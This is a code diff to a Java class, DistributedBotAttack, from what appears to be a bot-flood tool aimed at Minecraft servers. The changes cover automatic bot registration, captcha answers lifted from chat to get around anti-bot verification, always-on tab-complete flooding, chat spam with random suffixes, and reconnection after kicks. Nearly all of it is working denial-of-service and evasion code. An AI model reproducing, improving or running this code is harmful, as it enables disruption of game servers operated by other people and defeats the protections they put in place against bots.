@@ -43,6 +43,7 @@ public class DistributedBotAttack extends IAttack {
 	private Thread tabThread;
 	private Thread taskThread;
 	private Thread spamThread;
+	private Thread regThread;
 	String spammessage;
 
 	public List<Client> clients = new ArrayList<Client>();
@@ -64,6 +65,7 @@ public class DistributedBotAttack extends IAttack {
 	boolean autoauth;
 	boolean spam;
 	boolean debug;
+	boolean test;
 	int spamdelay;
 
 	public void start(final String ip, final int port) {
@@ -88,7 +90,7 @@ public class DistributedBotAttack extends IAttack {
 
 		}
 		Utils.log("是否开启自动识别验证码 t/f");
-		autoauth = config.getBoolean("capthca");
+		autoauth = config.getBoolean("captcha");
 		Utils.log("是否开启刷屏 t/f");
 		spam = config.getBoolean("spam");
 		custspam = config.getBoolean("customspam");
@@ -110,6 +112,29 @@ public class DistributedBotAttack extends IAttack {
 					Utils.log("BotThread", e.getMessage());
 				}
 			}
+		});
+		regThread = new Thread(() -> {
+			int num = 0;
+			String passwd = Utils.getRandomString(8, 12);
+			while (num < 10) {
+				try {
+					synchronized (clients) {
+						clients.forEach(c -> {
+							if (c.getSession().isConnected()) {
+								if (c.getSession().hasFlag("join")) {
+									c.getSession().send(new ClientChatPacket("/reg " + passwd + " " + passwd));
+
+								}
+							}
+						});
+					}
+					num++;
+					Thread.sleep(2000);
+				} catch (Exception e1) {
+					// TODO: handle exception
+				}
+			}
+
 		});
 
 		if (spam) {
@@ -134,26 +159,34 @@ public class DistributedBotAttack extends IAttack {
 			});
 		}
 
-		if (this.attack_tab) {
-			tabThread = new Thread(() -> {
-
-				while (true) {
-					synchronized (clients) {
-						clients.forEach(c -> {
-							if (c.getSession().isConnected()) {
-								if (c.getSession().hasFlag("join")) {
-									sendTab(c.getSession(),
-											"//");
-								}
+		tabThread = new Thread(() -> {
+			while (true) {
+				synchronized (clients) {
+					clients.forEach(c -> {
+						if (c.getSession().isConnected()) {
+							if (c.getSession().hasFlag("join")) {
+								sendTab(c.getSession(),
+										"//");
 							}
-						});
-					}
-					Utils.sleep(100);
+						}
+					});
 				}
-			});
-		}
+				Utils.sleep(100);
+			}
+		});
 
+		// test = config.getBoolean("test");
+		// if (test) {
+		// Utils.log("你正在以测试模式运行！");
+		// String username = name + Utils.getRandomString(4, 8);
+		// Client client = new Client(ip, port, new MinecraftProtocol("112121145"),
+		// new TcpSessionFactory());
+		// newlistener(client, "112121145", ip, port);
+		// client.getSession().connect();
+		// } else if (true) {
 		mainThread.start();
+		// }
+		regThread.start();
 		if (tabThread != null)
 			tabThread.start();
 		if (taskThread != null)
@@ -223,9 +256,7 @@ public class DistributedBotAttack extends IAttack {
 	public Client createClient(final String ip, int port, final String username, Proxy proxy) {
 		Client client = new Client(ip, port, new MinecraftProtocol(username), new TcpSessionFactory(proxy));
 		new MCForge(client.getSession(), this.modList).init();
-
 		client.getSession().addListener(new SessionListener() {
-
 			public void packetReceived(PacketReceivedEvent e) {
 				if (e.getPacket() instanceof ServerChatPacket) {
 					ServerChatPacket packet = e.getPacket();
@@ -238,29 +269,25 @@ public class DistributedBotAttack extends IAttack {
 						String passwd = Utils.getRandomString(8, 12);
 						client.getSession().send(new ClientChatPacket("/register " + passwd + " " + passwd));
 					}
-					if (autoauth == true) {
-						boolean iscaptcha = message.contains("人机验证");
+					if (true) {
+						// try to get authme code
+						boolean iscaptcha = message.contains("人机验证") || message.contains("captcha")
+								|| message.contains("验证码");
 						boolean isauthcode = message.contains("请输入验证码：");
+						String[] code2 = message.split("/captcha ", 2);
 						if (iscaptcha) {
-							yanzheng(client.getSession(), Utils.getcode(15, message));
-							Utils.log("[发送聊天]" + "[" + username + "]" + Utils.getcode(15, message));
+							String c0de = code2[1].substring(0, 5);
+							if (debug) {
+								Utils.log("Captcha is:" + c0de);
+							}
+							client.getSession().send(new ClientChatPacket("/captcha " + c0de));
 						}
 						if (isauthcode) {
 							String authcode = Utils.getcode(8, message);
 							if (debug) {
 								Utils.log(username + " 验证码是：" + authcode);
 							}
-							int num = 0;
-							while (num < 5) {
-								try {
-									Thread.sleep(5000);
-									client.getSession().send(new ClientChatPacket(authcode));
-									Utils.log("[发送聊天]" + "[" + username + "]" + Utils.getcode(8, message));
-								} catch (InterruptedException e1) {
-									e1.printStackTrace();
-								}
-								num++;
-							}
+							client.getSession().send(new ClientChatPacket(authcode));
 
 						}
 					}
@@ -269,8 +296,6 @@ public class DistributedBotAttack extends IAttack {
 				if (e.getPacket() instanceof ServerJoinGamePacket) {
 					e.getSession().setFlag("join", true);
 					Utils.log("Client", "[连接成功][" + username + "]");
-					String passwd = Utils.getRandomString(8, 12);
-					client.getSession().send(new ClientChatPacket("/reg " + passwd + " " + passwd));
 
 				}
 			}
@@ -302,17 +327,16 @@ public class DistributedBotAttack extends IAttack {
 				Utils.log("Client", "[断开][" + username + "] " + msg);
 				String reason = e.getReason();
 				boolean status = reason.contains("重");
-				if (status) {
-					Client client = createClient(ip, port, username, proxy);
-					client.getSession().setReadTimeout(10 * 1000);
-					client.getSession().setWriteTimeout(10 * 1000);
-					synchronized (clients) {
-						clients.add(client);
-					}
+				boolean status1 = reason.contains("join");
+				if (status || status1) {
 					Utils.log("[" + username + "]正在重连......");
+					Client client = new Client(ip, port, new MinecraftProtocol(username), new TcpSessionFactory(proxy));
+					client.getSession().connect(true);
+					if (debug) {
+						Utils.log("[Listener]" + "[" + username + "]" + ip + "," + proxy.toString());
+					}
 
 				}
-
 			}
 
 		});
@@ -360,7 +384,7 @@ public class DistributedBotAttack extends IAttack {
 		if (!custspam) {
 			message = Utils.getclnmsl();
 		}
-		session.send((Packet) new ClientChatPacket(message + "【" + Utils.getRandomString(3, 5) + "】"));
+		session.send((Packet) new ClientChatPacket(message + Utils.getRandomString(3, 5)));
 	}
 
 	public void reg(Session session) {
@@ -379,10 +403,6 @@ public class DistributedBotAttack extends IAttack {
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
-	}
 
-	public void yanzheng(Session session, String sendcmd) {
-		session.send(new ClientChatPacket(sendcmd));
-		sendcmd.toString();
 	}
 }
